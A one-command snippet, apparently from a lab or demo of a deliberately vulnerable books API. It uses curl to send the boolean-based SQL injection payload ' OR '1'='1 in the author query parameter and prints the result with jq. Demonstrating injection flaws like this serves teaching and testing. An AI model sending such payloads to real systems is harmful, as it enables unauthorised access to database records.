curl $URL/sqli/vulnerable/boolean-based/books \
  --header "Content-Type: application/json" \
  --request GET \
  -G --data-urlencode "author=' OR '1'='1" \
  -s | jq